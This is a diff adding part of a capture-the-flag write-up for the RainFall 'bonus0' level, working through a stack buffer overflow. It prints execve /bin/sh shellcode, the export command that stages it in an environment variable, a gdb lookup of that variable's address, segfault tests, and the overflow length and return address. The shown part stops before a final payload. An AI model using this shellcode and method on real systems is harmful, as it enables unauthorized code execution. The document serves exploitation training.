@@ -45,3 +45,41 @@ aaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbb???
 
 
 So if we can put a shell code in the second input, we maybe can execute it for example in a return address.
+
+We don t want to have the second input to have more than 19 bytes because we don t want to have anything after copied into the first input (Because of the missing \0).
+So we have 20 bytes for the first input + 19 bytes for the second input
+
+We have a problem, we have to write a shellcode
+\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80		--> 24 bytes
+but we only have 19 bytes for the second input (I explained that above)
+So we have to store this shellcode somewhere in the memory and then jump to it.
+We know that in the main arguments we have argc, argv and envp, and even if we have something like this :
+main (void)
+The env still exists in the memory, so we can store our shellcode, find the address of it and then jump to it.
+
+export SHELLCODEINJECTION=$(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+After we can find our env var with this command :
+https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
+https://shankaraman.wordpress.com/tag/finding-environment-variable-address-using-gdb/
+(gdb) x/s *((char **)environ)
+
+We have to do some other tests : 
+
+bonus0@RainFall:~$ ./bonus0 
+ - 
+AAAAAAAAAAAAAAAAAAAA
+ - 
+BBBBCCCCDDDDEEEEDDD
+AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEDDD BBBBCCCCDDDDEEEEDDD
+Segmentation fault (core dumped)
+
+		20 bytes		19 bytes	1bytes		19 bytes		
+<------------------><----------------->|<------------------>
+AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEDDD BBBBCCCCDDDDEEEEDDD
+
+We have 20 + 19 + 1 +19 = 59 bytes
+
+Now that we know that, we know we can overflow the s[42], to overwrite the return address.
+
+0xbffff8b8 in little endian = \xb8\xf8\xff\xbf
